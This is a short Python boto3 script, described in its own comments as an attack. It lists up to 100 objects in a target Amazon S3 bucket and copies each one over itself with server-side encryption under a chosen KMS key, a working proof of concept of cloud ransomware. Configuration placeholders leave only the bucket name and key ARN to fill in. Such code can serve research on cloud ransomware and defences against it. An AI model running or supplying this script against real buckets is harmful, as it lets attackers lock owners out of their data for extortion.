#!/usr/bin/env python3

import boto3

#################################
############ Config #############
#################################
aws_cli_profile = 'default'  # The AWS CLI profile to use for the attack
bucket_name = 's3-bucket-to-target'  # The S3 bucket to target with the attack
kms_key_arn = 'arn:aws:kms:REGION:ACCOUNT-ID:key/KEY-ID'  # The KMS key ARN to use for the attack (must be in the same region as the S3 bucket)
#################################


session = boto3.Session(profile_name=aws_cli_profile)

client = session.client('s3')

objects = client.list_objects_v2(Bucket=bucket_name, MaxKeys=100)['Contents']

client = session.resource('s3')

for obj in objects:
    client.meta.client.copy({'Bucket': bucket_name, 'Key': obj['Key']}, bucket_name, obj['Key'], ExtraArgs={'ServerSideEncryption': 'aws:kms', 'SSEKMSKeyId': kms_key_arn})

print(f'Complete! Encrypted {len(objects)} objects!')
